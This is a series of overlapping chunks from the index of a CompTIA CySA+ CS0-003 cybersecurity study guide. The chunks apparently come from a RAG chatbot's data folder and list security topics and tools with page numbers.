network forensics, 458–460 post-­incident activity and evidence acquisition, 462–472 review questions, 484–487 forensic copies, 465–466 forensic drive duplicators, 449 forensic images, importing, 473–474 forensic investigation about, 472–473 analyzing images, 474–478 example of, 472–480 findings and analysis, 479 goals of, 478 importing forensic images, 473–474 lessons learned, 480 reporting, 478–479 root cause analysis, 479–480 suite for, 449 targets of, 478–479 forensic procedures, 463–464 forensic software about, 449 analysis utilities, 452 capabilities and application of, 450–451 carving, 452–453 chain of custody tracking, 454 hashing and validation, 454–455 imaging media and drives, 452 forums, 139 forwarded events logs, 183 forwarding, 116 4Discovery, 470 FTK Imager, 389, 471 FTP-­Secure (FTPS), 267–268 function as a service (FaaS), 38–39 functional impact, 358–359 functions, insecure, 320 fuzzing/fuzz testing, 322–323 G General Data Protection Regulation (GDPR), 6 Generally Accepted Privacy Principles (GAPP), 6 generic top-­level domain (gTLD), 186 GNU debugger (GDB), 325 goals, of forensic investigation, 478 Google, 59–60, 189 Google Domains, 186 Gramm-­Leach-­Bliley Act (GLBA), 204 graphical user interface (GUI), 172 grep command, 123–125 Group Policies, 20 Group Policy Object (GPO), 20, 21, 34–35 guidelines, 330–331 H hack-­back techniques, for threat hunting, 151 hacktivists, as threat actors, 147 hardening operating systems, 41–42 system configuration, 19 hardware architecture for, 45 for reverse engineering, 26–27 write blockers for, 468 harvesting data from DNS and Whois, 184–190 hashing, 454–455 Health Insurance Portability and Accountability Act (HIPAA), 204 heuristics, 85 hibernation files, 471–472 Honeynet project, 151 519 520 honeypots – indicators of compromise (IOCs) honeypots, 18–19, 151 host command, 190 host intrusion prevention systems (HIPSs), 20 host-­related issues investigating, 91–100 malicious processes, 95–97 malware, 95–97 social engineering, 99–100 system resources, 91–95 unauthorized access, changes, and privileges,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	21, 34–35 guidelines, 330–331 H hack-­back techniques, for threat hunting, 151 hacktivists, as threat actors, 147 hardening operating systems, 41–42 system configuration, 19 hardware architecture for, 45 for reverse engineering, 26–27 write blockers for, 468 harvesting data from DNS and Whois, 184–190 hashing, 454–455 Health Insurance Portability and Accountability Act (HIPAA), 204 heuristics, 85 hibernation files, 471–472 Honeynet project, 151 519 520 honeypots – indicators of compromise (IOCs) honeypots, 18–19, 151 host command, 190 host intrusion prevention systems (HIPSs), 20 host-­related issues investigating, 91–100 malicious processes, 95–97 malware, 95–97 social engineering, 99–100 system resources, 91–95 unauthorized access, changes, and privileges, 97–99 unauthorized software, 95–97 hosts, pinging, 163–165 hybrid network architectures, 49 I identification failures, 281–283 identities, 53 identity and access management (IAM) about, 53 Active Directory Federation Services (AD FS), 62–63 cloud access security brokers (CASBs), 65 federated identity, 57–61 federation, 56–57 multifactor authentication (MFA), 54–55 OAuth 2.0 protocol, 63–64 OpenID Connect, 64 passwordless, 55 privileged access management (PAM), 64–65 SAML, 62 single sign-­on (SSO), 55–56 identity provider (IDP), 57 images, analyzing, 474–478 imaging live systems, 468–469 media and drives, 452, 466–467 immunity debugger, 325 impact, determining, 10–11 impact assessment, 439 impact score, calculating, 254 impact sub-­score (ISS), calculating, 254 impersonation attacks, 282, 357 importing forensic images, 473–474 impossible travel, 121 improper usage, as threats, 357 improving efficiency/process, 27–31 in-­band NAC solutions, 13 inbound firewall rules activity, creating, 33–34 incident communications plan activity, developing, 370 incident containment options activity, 414–415 incident detection and analysis about, 378, 389–390 answers to review questions, 505–507 evidence acquisition and preservation, 388–389 exam essentials, 390 indicators of compromise (IoCs), 378–380 investigating indicators of compromise (IoCs), 381–387 lab exercises, 391–392 review questions, 393–396 incident eradication and recovery. See eradication phase; recovery phase incident reporting activity, 442 incident response documenting plans for, 353–354 efficiency in, 29–31 metrics and KPIs, 436–437 performing forensic analysis and techniques for (See forensic analysis and techniques, for incident response) phases activity, 370 process of, 398 reporting, 437–439 reporting and communication, 431–439 threat intelligence and, 142 incident response programs about, 344, 367–368 answers to review questions, 503–504 attack frameworks, 361–367 building foundation for, 351–354 classifying incidents, 356–361 creating team for incident response, 354–356 exam essentials, 368–369 lab exercises, 369–371 phases of, 345–351 review questions, 372–375 security incidents, 344–345 incident response team, creating, 354–356 incident severity classification activity, 369 incidents classifying, 356–361 declaration and escalation of, 432 indicators of attack (IoAs), 378 indicators of compromise (IOCs) about, 86, 306, 378–380, 411 combining, 387 denial-­of-­service (DoS) attacks, 385–386 file and configuration modifications, 384–385 industrial control systems (ICSs) – lab exercises increases in resource usage, 382–383 investigating, 381–387 login and rights usage anomalies, 385 types of, 150–151 unusual DNS traffic, 387 unusual network traffic, 381–382 unusual user and account behaviors, 383–384 industrial control systems (ICSs), 275 industry standards, on vulnerability management, 207–208 information aggregation, tools for, 190 information analysis, tools for, 190 information gathering, using packet capture, 190–192 information security policy framework about, 325 exceptions and compensating controls, 331–332 guidelines, 330–331 policies, 326–327 procedures, 329–330 standards,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	compromise (IOCs) about, 86, 306, 378–380, 411 combining, 387 denial-­of-­service (DoS) attacks, 385–386 file and configuration modifications, 384–385 industrial control systems (ICSs) – lab exercises increases in resource usage, 382–383 investigating, 381–387 login and rights usage anomalies, 385 types of, 150–151 unusual DNS traffic, 387 unusual network traffic, 381–382 unusual user and account behaviors, 383–384 industrial control systems (ICSs), 275 industry standards, on vulnerability management, 207–208 information aggregation, tools for, 190 information analysis, tools for, 190 information gathering, using packet capture, 190–192 information security policy framework about, 325 exceptions and compensating controls, 331–332 guidelines, 330–331 policies, 326–327 procedures, 329–330 standards, 327–329 Information Sharing and Analysis Centers (ISACs), 145–146 Information Sharing and Analysis Organizations (ISAOS) program (CISA), 137 informational results, 257–258 infrastructure concepts and design, 38–40 vulnerability scanning, 228–229 injection attack, 276 injection flaws, 276–277 input validation, 321 insecure design, 267–268 insider threats, as threat actors, 147 installation as stage in Lockheed Martin’s Cyber Kill Chain, 365 vulnerability scanners activity, 239–240 integrating technology/tools, 29 integrity in CIA Triad, 4–5 loss of, 360–361 metric for, 252 intelligence dissemination, in threat intelligence life cycle, 145 intelligence gathering. See reconnaissance and intelligence gathering interception proxies, 235–237 internal footprint, 168 internal IP disclosure, 274 internal scans, 217 521 International Organization for Standardization (ISO), 208 Internet Assigned Numbers Authority (IANA), 166, 186 Internet Control Message Protocol (ICMP), 81, 164 Internet Engineering Task Force (IETF), 63 Internet of Things (IoT), 275 interpreting CVSS vector, 253–254 vulnerability scans activity, 285 intrusion detection systems (IDSs) logs for, 109–110 as on-­premises network architecture, 47 intrusion prevention systems (IPSs) logs for, 109–110 as on-­premises network architecture, 47 IoCs in Alienvault’s Open Threat Exchange activity, 391 IP disclosure, internal, 274 IP ranges, 186–187 iPerf, 81 isolation, 25, 402–403 IT governance, 227 IT service management (ITSM) tool, 221–222 J J-­Flow, 79 Joe Sandbox, 120 JSON, 125–126 jump box, 17–18, 50 jump server. See jump box K key performance indicators (KPIs) incident response, 436–437 vulnerability management, 428–429 knowledge factors, multifactor authentication (MFA) and, 54 Kubernetes, 39 L lab exercises containment, eradication, and recovery, 414–416 522 labeling tools – Meta-­ Features cybersecurity analytics, 33–36 forensic analysis and techniques, for incident response, 481–483 incident detection and analysis, 391–392 incident response programs, 369–371 malicious activity, 128–130 reconnaissance and intelligence gathering, 193–195 reporting and communication, 441–442 system and network architecture, 70–72 threat intelligence, 153–154 vulnerabilities, 334–335 vulnerability management, 239–240 vulnerability scans, 285–287 labeling tools, 450 Latin America and Caribbean Network Information Centre (LACNIC), 187 law enforcement, incident communications and, 435 legacy systems, 227, 430 legal counsel, incident communications and, 433 legal holds, 388, 392, 464–465 lessons learned conducting sessions, 411 in forensic investigation, 480 incident communications and, 436 review of, 349–350 levels, of logging, 46 licensing limitations, for vulnerability scans, 211 life cycle, intelligence, 144–145 Lightweight Directory Access Protocol (LDAP), 56 likelihood, determining, 10–11 LiME, 471 Linux services, 102–103 live systems, imaging, 468–469 load testing, 87, 323–324 local file inclusion (LFI) attacks, 280 location as criteria for NAC solutions, 14 of files, 43–44 multifactor authentication (MFA) and, 54
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Caribbean Network Information Centre (LACNIC), 187 law enforcement, incident communications and, 435 legacy systems, 227, 430 legal counsel, incident communications and, 433 legal holds, 388, 392, 464–465 lessons learned conducting sessions, 411 in forensic investigation, 480 incident communications and, 436 review of, 349–350 levels, of logging, 46 licensing limitations, for vulnerability scans, 211 life cycle, intelligence, 144–145 Lightweight Directory Access Protocol (LDAP), 56 likelihood, determining, 10–11 LiME, 471 Linux services, 102–103 live systems, imaging, 468–469 load testing, 87, 323–324 local file inclusion (LFI) attacks, 280 location as criteria for NAC solutions, 14 of files, 43–44 multifactor authentication (MFA) and, 54 Lockheed Martin’s Cyber Kill Chain, 364–366 log analysis, 105, 175–183 log data, acquiring and reviewing, 470 log viewers, 458 logging about, 69 considerations for, 47 insufficient, 320 levels of, 46 time synchronization, 45–46 logins, usage anomalies, 385 logs about, 105–106, 347 event, 106 firewall, 108 intrusion detection systems (IDSs), 109–110 intrusion prevention systems (IPSs), 109–110 proxy, 109 reconciling, 258 security device, 107–110 loss of equipment, as threats, 357 M MAC address checking, 88–89 machine learning (ML), 114, 283 magnitude, of risk, 296 maintenance windows, 309 malicious activity about, 78, 126–127 analyzing network events, 78–90 answers to review questions, 492–493 determining using tools and techniques, 104–126 exam essentials, 127–128 investigating host-­related issues, 91–100 investigating service-­and application-­related issues, 100–104 lab exercises, 128–130 review questions, 131–134 malicious processes, 95–97 Maltego, 172 malware, 95–97 managerial controls, 304 mandatory access control (MAC), 21 man-­in-­the-­middle (MitM) attacks, 282–283 mapping, 160–163 MD5, 119, 454 mean time to detect, 436 mean time to remediate, 436 mean time to respond, 436 media communications, 434 imaging, 452 memorandums of understanding (MOUs), 227, 430 memory consumption and monitoring, 91 endpoint forensics and memory dump analysis, 455–458 forensics of, 456 memory-­resident data, capturing, 470–471 Meta-­Features, in Diamond Model of Intrusion Analysis, 362 Metasploit – ongoing scanning Metasploit, 96 Metasploit Framework (MSF), 172–173, 194–195 metrics incident response, 436–437 vulnerability management, 428–429 Microsoft Endpoint Manager, 95 threat intelligence blog, 137 Microsoft Remote Procedure Call (MSRPC), 169–170 MISP Threat Sharing project, 137 missing firmware updates, 269–270 missing patches, 261–263 mitigation options, 425 MITRE ATT&CK Framework, 361–362, 363, 370–371 mobile device management (MDM), 262–263 mobile devices acquisitions from, 472 forensics for, 456 security of, 262–263 modeling, threat, 305–307 multifactor authentication (MFA), 17, 54–55 mutation testing, 323 National Archives General Records, 351 National Council of ISACs, 145 National Institute of Standards and Technology (NIST) about, 8, 220–221, 344, 353 Computer Forensic Reference Data Sets (CFReDS), 473 conducting Rhino Hunt activity, 482–483 National Software Reference Library, 455 SP 800-­61 Computer Security Incident Handling Guide, 433 SP 800-­88: Guidelines for Media Sanitization, 408–409 SP 800-­115, 161 National Security Agency (NSA), 26–27 National Software Reference Library (NSRL), 92 nation-­state threat actors, 146 negative report, 256 Nessus, 215, 228, 236, 249 netcat, 96 Netflow, 177–178 netstat, 178–179 network access control (NAC), 12–14, 48 network address translation (NAT), 274 523 network architecture. See system and network architecture network devices configuration, 177 logging and, 175–179 logs, 175–176 Netflow, 177–178 netstat, 178–179 network events
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	344, 353 Computer Forensic Reference Data Sets (CFReDS), 473 conducting Rhino Hunt activity, 482–483 National Software Reference Library, 455 SP 800-­61 Computer Security Incident Handling Guide, 433 SP 800-­88: Guidelines for Media Sanitization, 408–409 SP 800-­115, 161 National Security Agency (NSA), 26–27 National Software Reference Library (NSRL), 92 nation-­state threat actors, 146 negative report, 256 Nessus, 215, 228, 236, 249 netcat, 96 Netflow, 177–178 netstat, 178–179 network access control (NAC), 12–14, 48 network address translation (NAT), 274 523 network architecture. See system and network architecture network devices configuration, 177 logging and, 175–179 logs, 175–176 Netflow, 177–178 netstat, 178–179 network events analyzing, 78–90 capturing network-­related events, 79–82 detecting and finding rogue devices, 88–90 detecting common network issues, 82–86 detecting denial-­of-­service (DoS) and distributed denial-­of-­service (DDoS) attacks, 87–88 detecting network attacks, 88 detecting scans and sweeps, 86–87 network forensics about, 458 Tcpdump, 459–460 Wireshark, 458–459 network scanning about, 89 as on-­premises network architecture, 48 supplementing, 216–217 network segmentation, 17–18, 49–51 Network Time Protocol (NTP), 46 network-­related events, capturing, 79–82 networks building secure, 12–19 detecting attacks, 88 identifying scans, 128–129 mapping, 162–163 perimeter security, 14–17 unusual traffic for, 381–382 vulnerabilities, 269–274 Nexpose, 229 next-­generation firewalls (NGFWs), 17 Nikto, 233, 234 nmap, 169–170 notebooks, 450 notice, Generally Accepted Privacy Principles (GAPP) for, 6 O OAuth, 56, 61, 63–64 object references, insecure, 319–320 ongoing operations and maintenance phase, in software development life cycle (SDLC), 312 ongoing scanning, 222 524 on-­path attacks – penetration testing on-­path attacks, 282–283 on-­premises network architecture, 47–48 Open Indicators of Compromise (OpenIOC), 143 open source intelligence (OSINT), 136, 137–139, 173–174 Open Source Security Testing Methodology Manual (OSSTMM), 161, 367 Open Vulnerability and Assessment Language (OVAL), 221 Open Web Application Security Project (OWASP), 208, 367 OpenFlow, 51–52 OpenID, 56 OpenID Connect, 56, 61, 64 OpenIOC (Open Indicators of Compromise), 143 The Open Threat Exchange, 137 OpenVAS, 229 operating system (OS) endpoint forensics and, 455–458 file structure/locations, 43–44 fingerprinting, 167–168 hardening, 19, 72 hardware architecture, 45 health of, as criteria for NAC solutions, 14 isolating affected, 402–403 patching, 407–408 processes, 44 reimaging, 469 system hardening, 41–42 system processes, 44 Windows Registry, 42–43 operating system resources drive capacity consumption and monitoring, 92 filesystem changes and anomalies, 92 memory consumption and monitoring, 91 monitoring tools, 92–95 processor consumption and monitoring, 91 operational controls, 12, 304 operational technology (OT), 275 operations constraints for vulnerability scans, 211 streamlining, 28 Organization for the Advancement of Structured Information Standards (OASIS), 143 organizational governance, 430 organized crime, as threat actors, 146 original equipment manufacturers (OEMs), 26 outdated components, 263–264 out-­of-­band NAC solutions, 13 output encoding, 321 OVAL (Open Vulnerability and Assessment Language), 221 overcoming risks of vulnerability scanning, 227–228 OWASP (Open Web Application Security Project), 208, 367 P packet capture about, 111–112 information gathering using, 190–192 for pentesters, 174 packet filtering firewalls, 16 packet sniffer, 458 Pacu, 230, 233 paid feeds, 139 parameterized queries, 321 passive discovery about, 175, 308 configuration analysis, 175–183 harvesting data from DNS an Whois, 184–190 information aggregation and analysis tools, 190 information gathering using packet
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	(OASIS), 143 organizational governance, 430 organized crime, as threat actors, 146 original equipment manufacturers (OEMs), 26 outdated components, 263–264 out-­of-­band NAC solutions, 13 output encoding, 321 OVAL (Open Vulnerability and Assessment Language), 221 overcoming risks of vulnerability scanning, 227–228 OWASP (Open Web Application Security Project), 208, 367 P packet capture about, 111–112 information gathering using, 190–192 for pentesters, 174 packet filtering firewalls, 16 packet sniffer, 458 Pacu, 230, 233 paid feeds, 139 parameterized queries, 321 passive discovery about, 175, 308 configuration analysis, 175–183 harvesting data from DNS an Whois, 184–190 information aggregation and analysis tools, 190 information gathering using packet capture, 190–192 log analysis, 175–183 passive monitoring, 82 passive scanning, 212 password crackers, 456–457 password policy, 327 password recovery, 456–457 password reuse, 281–282 password spraying attacks, 281–282 passwordless authentication, 55 patch management, 19–20, 310 patching about, 427 missing patches, 261–263 procedures for, 330 systems and applications, 407–408 pattern recognition, 114–115 Payment Card Industry Data Security Standard (PCI DSS), 160, 205, 213–214, 332 Payment Card Industry Security Standards Council (PCI SSC), 205 penetration testing about, 21–22 adversary emulation and, 308 asset discovery and, 161 Penetration Testing Execution Standard – quantitative risk assessments communicating results from, 24 conducting discovery, 23 executing, 23–24 planning, 22–23 training and exercises, 24 writing plans activity, 35–36 Penetration Testing Execution Standard, 161 pentesters, packet capture for, 174 people, 347 performance constraints, for vulnerability scans, 211 Performance Monitor (perfmon), 92, 93 perimeter security, 14–17 persistent XSS attacks, 277 personally identifiable information (PII), 5, 68 phases, of incident response, 345–351 phishing, 117, 129–130 ping command, 165 pinging, 81, 163–165 planning poker, 316 platform as a service (PaaS), 48 playbooks, 352–353 plug-­ins, 29, 215, 219–220 point-­of-­sale (POS) systems, 20 policies, 352, 326–327 Policy Block List (PBL), 138 port range, 170 port scanning activity with, 193–194 tools and techniques for, 165–174 port security, 89 portability, containerization and, 40 PortSwigger, 237 positive report, 256 possession factors, multifactor authentication (MFA) and, 54 PostgreSWL Workload Analyzer (PoWA), 382–383 post-­incident activity. See also evidence acquisition about, 349–351, 462 acquiring other data, 470–472 conducting forensic analysis, 463 forensic procedures, 463–464 imaging live systems, 468–469 legal holds and preservation, 464–465 reimaging systems, 469 PowerShell, 122–123 preparation phase, of incident response, 346 preservation, 388–389, 464–465 Presidential Decision Directive-­63 (PDD-­63), 145–146 525 preventive controls, 304 primary account number (PAN), 68 prioritization, 224–226, 425 privacy, security versus, 5–6 privilege escalation, 265–266 privilege management, 53 privileged access management (PAM), 64–65 privileges required (PR) metric, 251 probability, of risk, 296 procedures, 329–330, 352–353 Process for Attack Simulation and Threat Analysis (PASTA) model, 305 process modeling, in Rapid Application Development (RAD) model, 317 processes change control, 411 endpoint forensics and, 455–458 improving, 27–31 malicious, 95–97 standardizing, 28 system, 44 processors, consumption and monitoring, 91 product diversity, 50–51 proprietary intelligence, 139–140 proprietary systems, 227, 430 protected health information (PHI), 68, 204 protecting email, 115–119 protocol analysis, 85 providers, incident response, 355 provisioning, 59 Prowler, 232, 234 proxy logs, 109 public incident report activity, 441 public key infrastructure (PKI), 66–67 public relations, incident communications and,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	required (PR) metric, 251 probability, of risk, 296 procedures, 329–330, 352–353 Process for Attack Simulation and Threat Analysis (PASTA) model, 305 process modeling, in Rapid Application Development (RAD) model, 317 processes change control, 411 endpoint forensics and, 455–458 improving, 27–31 malicious, 95–97 standardizing, 28 system, 44 processors, consumption and monitoring, 91 product diversity, 50–51 proprietary intelligence, 139–140 proprietary systems, 227, 430 protected health information (PHI), 68, 204 protecting email, 115–119 protocol analysis, 85 providers, incident response, 355 provisioning, 59 Prowler, 232, 234 proxy logs, 109 public incident report activity, 441 public key infrastructure (PKI), 66–67 public relations, incident communications and, 433–434 publicly available information, 347 Purge option, for secure disposal, 408 Python, 121–122 Q qualitative risk assessments, 297, 298–299 quality, Generally Accepted Privacy Principles (GAPP) for, 6 Qualys, 228–229, 249 quantitative risk assessments, 297–298 526 race conditions – reverse engineering R race conditions, 320 Ransomware Playbook, 353 Rapid Application Development (RAD) model, 317 Rapid7, 229 recommendations, 437 reconciling scan results, 258–259 reconnaissance and intelligence gathering about, 160, 192 active reconnaissance, 161–162 activity for, 154 answers to review questions, 495–497 common tools for, 169–174 configuration analysis, 175–183 device fingerprinting, 167–168 exam essentials, 192–193 harvesting data from DNS and Whois, 184–190 information aggregation and analysis tools, 190 information gathering using packet capture, 190–192 lab exercises, 193–195 log analysis, 175–183 mapping, enumeration, and asset discovery, 160–174 mapping networks, 162–163 operating system fingerprinting, 167–168 passive discovery, 175–192 pinging hosts, 163–165 port scanning tools and techniques, 165–174 review questions, 196–199 service discovery tools and techniques, 165–174 service identification, 168–169 as stage in Lockheed Martin’s Cyber Kill Chain, 364, 365 topology, 162–163 version identification, 168–169 Recon-­ng, 173–174 recoverability effort, 359 recovery phase about, 406–407 patching systems and applications, 407–408 remediation and reimaging, 407 sanitization and secure disposal, 408–409 recurrence, 425 reflected XSS attacks, 277 regedit tool, 42–43 registered ports, 166 regression testing, 324 regular expressions (regex), 123–125 regulatory environment, on vulnerability management, 204–207 regulatory reporting, incident communications and, 434–435 regulatory requirements, for vulnerability scans, 211 reimaging systems, 469 relying party (RP), 57 remediation developing workflows for, 221–226 during eradication and recovery phases, 407 inhibitors to, 430 vulnerabilities activity, 287 Remote Authentication Dial-­In User Service (RADIUS), 13 remote code execution, 266–267 Remote Desktop Protocol (RDP), 17 remote file inclusion (RFI) attacks, 280 removal, of compromised systems, 403–405 renewing domains, 186 reporting and communication about, 424, 439 answers to review questions, 509–511 exam essentials, 440 in forensic investigation, 478–479 incident response, 431–439 lab exercises, 441–442 review questions, 443–446 vulnerability management and, 222–224, 424–431 of vulnerability scans, 247–256 request forgery attacks, 280 requirements, for vulnerability management, 204–212 research, threat, 305–307 Réseaux IP Européens Network Coordination Centre (RIPE NCC), 187 Resource Monitor (resmon), 92, 93 resource usage, increases in, 382–383 response finalizing, 410–412 to vulnerabilities, 293–339 responsive controls, 304 results, of vulnerability scans, 256–260 retention of evidence, 412 Generally Accepted Privacy Principles (GAPP) for, 6 reverse engineering about, 25 hardware for, 26–27 isolation, 25 sandboxing, 25 software for, 25–26 review questions – security controls review questions containment, eradication, and recovery,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	478–479 incident response, 431–439 lab exercises, 441–442 review questions, 443–446 vulnerability management and, 222–224, 424–431 of vulnerability scans, 247–256 request forgery attacks, 280 requirements, for vulnerability management, 204–212 research, threat, 305–307 Réseaux IP Européens Network Coordination Centre (RIPE NCC), 187 Resource Monitor (resmon), 92, 93 resource usage, increases in, 382–383 response finalizing, 410–412 to vulnerabilities, 293–339 responsive controls, 304 results, of vulnerability scans, 256–260 retention of evidence, 412 Generally Accepted Privacy Principles (GAPP) for, 6 reverse engineering about, 25 hardware for, 26–27 isolation, 25 sandboxing, 25 software for, 25–26 review questions – security controls review questions containment, eradication, and recovery, 417–420 forensic analysis and techniques, for incident response, 484–487 incident detection and analysis, 393–396 incident response programs, 372–375 malicious activity, 131–134 reconnaissance and intelligence gathering, 196–199 reporting and communication, 443–446 system and network architecture, 73–76 threat intelligence, 155–158 vulnerabilities, 336–339 vulnerability management, 241–244 vulnerability scans, 288–291 rights, usage anomalies, 385 risk acceptance, 302–303 risk appetite, 211 risk avoidance, 302 risk management about, 300 activity for, 335 risk acceptance, 302–303 risk avoidance, 302 risk mitigation, 300–302 risk transference, 302 strategies activity, 334 risk mitigation, 300–302 risk score, 425 risk transference, 302 risks about, 7 analyzing, 294–300 calculating, 296 defined, 294 determining, 10–11 identification and assessment activity, 334 identification process for, 295–296 likelihood of, 297 overcoming for vulnerability scanning, 227–228 severity of, 296 rogue devices, detecting and finding, 88–90 role, as criteria for NAC solutions, 14 root cause analysis (RCA). See root cause analysis (RCA) root key, 42–43 rootkits, 265–266 router-­based monitoring, 79–81 running vulnerability scans, 240 527 S sandboxing, 25, 120, 403 sanitization disposal techniques activity and, 416 during eradication and recovery phases, 408–409 SANS, 96 SANS Internet Storm Center, 138 scan perspectives, 217–218 scheduled tasks, unauthorized, 98–99 scheduling vulnerability scans, 210–212 schtasks command, 98 scope about, 439 of control, 356 of impact, 358–359 metric for, 253 of vulnerability scans, 213–214 Scout Suite, 229–230 screened subnet, 15 script kiddies, as threat actors, 147 secure access service edge (SASE), 52–53 secure endpoint management, 19–21 Secure File Transfer Protocol (SFTP), 267–268 Secure Hash Algorithm (SHA), 26 Secure Shell (SSL), 17 Secure Sockets Layer (SSL), 67–68, 270 security appliances and tools for, 110–111 designing and coding for, 319–321 email, 118–119 endpoint software for, 20–21 evaluating risks, 6–12 federated identities and, 57–58 Generally Accepted Privacy Principles (GAPP) for, 6 identifying tools for, 483 misconfiguration of, 268–269 of mobile devices, 262–263 privacy versus, 5–6 recognizing tools for, 36 security, audit, and compliance stakeholders, 426 Security Assertion Markup Language (SAML), 61–62 Security Content Automation Protocol (SCAP), 220–221 security controls implementing, 303–304 testing, 308 528 security device logs – system and network architecture security device logs, 107–110 security engineering, threat intelligence and, 142 security incidents, 344–345 security information and event management (SIEM), 30, 105, 110, 259 security logs, 183 security orchestration, automation, and response (SOAR), 28, 29, 110–111 Security-­Enhanced Linux (SELinux), 21 segmentation, 49–51, 400–401 Sender Policy Framework (SPF), 117, 118 Senki.org, 137 sensitive data, exposure of, 320 sensitivity levels, of vulnerability scans, 214–215 server vulnerabilities, 261–269 serverless
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	for, 36 security, audit, and compliance stakeholders, 426 Security Assertion Markup Language (SAML), 61–62 Security Content Automation Protocol (SCAP), 220–221 security controls implementing, 303–304 testing, 308 528 security device logs – system and network architecture security device logs, 107–110 security engineering, threat intelligence and, 142 security incidents, 344–345 security information and event management (SIEM), 30, 105, 110, 259 security logs, 183 security orchestration, automation, and response (SOAR), 28, 29, 110–111 Security-­Enhanced Linux (SELinux), 21 segmentation, 49–51, 400–401 Sender Policy Framework (SPF), 117, 118 Senki.org, 137 sensitive data, exposure of, 320 sensitivity levels, of vulnerability scans, 214–215 server vulnerabilities, 261–269 serverless computing, 38–39 server-­side request forgery (SSRF) attacks, 281 service level agreements (SLAs), 430 service level objectives (SLOs), 329, 429 service provider (SP), 57 service-­level agreements (SLAs), 227 service-­related issues, investigating, 100–104 services degradations to, 227 identifying, 168–169 monitoring, 100–101 tools and techniques for discovery of, 165–174 session hijacking, 283 session management, security of, 321 severity, classification of, 358–361 sFlow, 79 SHA1, 454 SHA256, 119 Shared Assessments, 48 shared authentication, 55 sharing threat intelligence, 142–144 shell script, 122 show logging command, 182 SIFT, 452 Simple Network Management Protocol (SNMP), 79, 175, 177 single loss expectancy (SLE), 297 single pane of glass, 29 single sign-­on (SSO), 55–56 site surveys, 89 Snowden, Edward, 27, 300 social engineering, 99–100 social media, 139 software assessing, 322–325 assurance best practices, 310–318 common development security issues, 319–320 development models, 313–317 fingerprinting, 26 forensic, 449 for reverse engineering, 25–26 scanner, 219 security testing, 321–325 unauthorized, 95–97 write blockers, 468 software as a service (SaaS), 48 software development life cycle (SDLC), 310–311 software-­defined network wide area networks (SDN-­WANs), 52 software-­defined networking (SDN), 51–52 source code analysis, 322 Spamhaus, 138 Spamhaus Block List (SBL), 138 Spiral model, 314–315 Splunk, 105 stakeholders, identifying and communicating with, 426, 431–432 standardizing processes, 28 standards, 327–329 standards-­based threat information sharing, 142–144 start of authority (SOA), 188 stateful inspection firewalls, 17 static code analysis, 322 STIX/TAXII feed activity, 153–154 streamlining operations, 28 stress test applications, 323–324 STRIDE classification model, 305 strings command, 120 structural threats, 9 structure, of files, 43–44 Structured Threat Information Expression (STIX), 143 subjects, 53 summarizing CVSS scores, 254–256 supervisory control and data acquisition (SCADA) systems, 275 supplementing network scans, 216–217 supply chain assessing, 299–300 as threat actors, 147 suspicious login activity, identifying, 391–392 sweeps, detecting, 86–87 Sysinternals suite, 93, 98 Syslog, 107 system and network architecture about, 38, 68–69 answers to review questions, 490–491 cloud network architecture, 48–49 system log files – Tripwire encryption and sensitive data protection, 65–68 exam essentials, 70 hybrid network architecture, 49 identity and access management (IAM), 53–65 infrastructure concepts and design, 38–40 lab exercises, 70–72 logging, 45–47 network segmentation, 49–51 on-­premises network architecture, 47–48 operating system concepts, 41–45 review questions, 73–76 secure access service edge (SASE), 52–53 software-­defined networking (SDN), 51–52 zero trust, 52 system log files, 183 system ports, 166 T tactics, techniques, and procedures (TTP), 147–148 targets, of forensic investigation, 478–479 tarpits, for threat hunting, 151 Task Scheduler, 98–99 Tcpdump, 111–112, 459–460 technical controls,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	review questions, 490–491 cloud network architecture, 48–49 system log files – Tripwire encryption and sensitive data protection, 65–68 exam essentials, 70 hybrid network architecture, 49 identity and access management (IAM), 53–65 infrastructure concepts and design, 38–40 lab exercises, 70–72 logging, 45–47 network segmentation, 49–51 on-­premises network architecture, 47–48 operating system concepts, 41–45 review questions, 73–76 secure access service edge (SASE), 52–53 software-­defined networking (SDN), 51–52 zero trust, 52 system log files, 183 system ports, 166 T tactics, techniques, and procedures (TTP), 147–148 targets, of forensic investigation, 478–479 tarpits, for threat hunting, 151 Task Scheduler, 98–99 Tcpdump, 111–112, 459–460 technical controls, 12, 303 technical stakeholders, 426 technology federated identity, 61–64 integrating, 29 Terminal Access Controller Access Control System (TACACS), 177 testing code, 322–325 developing strategies for, 367 fixes, 225 incident response plan, 356 in Rapid Application Development (RAD) model, 317 testing and integration phase, in software development life cycle (SDLC), 312 theft of equipment, as threats, 357 threat actors, 146–147 threat hunting focusing, 149–150 proactive, 148–149 tools and techniques for, 151 threat intelligence about, 136–137, 151–152 answers to review questions, 493–495 applying organizationwide, 148–151 529 assessing, 140–141 community, 145–146 exam essentials, 152–153 intelligence cycle, 144–145 lab exercises, 153–154 open source intelligence, 137–139 planning, 144–145 proprietary and closed source intelligence, 139–140 review questions, 155–158 sharing, 142–144 threat classification, 146–148 threat reputation, 306 ThreatConnect rating system, 141 Threatfeeds.io, 137 threats about, 7 categories of, 9 classification of, 305–307, 357–358 defined, 294 identifying, 9–10 research and modeling, 305–307 time of day, as criteria for NAC solutions, 14 time synchronization, 45–46 time to live (TTL), 162 timeboxing, 316 timeline, 437 tools and techniques critical infrastructure and operational, 275 determining malicious activity using, 104–126 forensics, 449–450 for information aggregation and analysis, 190 integrating, 29 for port scanning, 165–174 for security, 110–111 for service discovery, 165–174 for threat hunting, 151 for vulnerability assessment, 228–237 Top 10 lists, in vulnerability management, 429 traceroute, 185 tracking chain of custody, 454 traffic analysis, 89 traffic spikes, 85–86 training of employees, 428 for penetration tests, 24 training and transition phase, in software development life cycle (SDLC), 312 Transport Layer Security (TLS), 67, 270 trend analysis, 259 trends, in vulnerability management, 428 Tripwire, 119 530 trust decisions – vulnerability management programs trust decisions, 59 Trusted Automated Exchange of Indicator Information (TAXII) protocol, 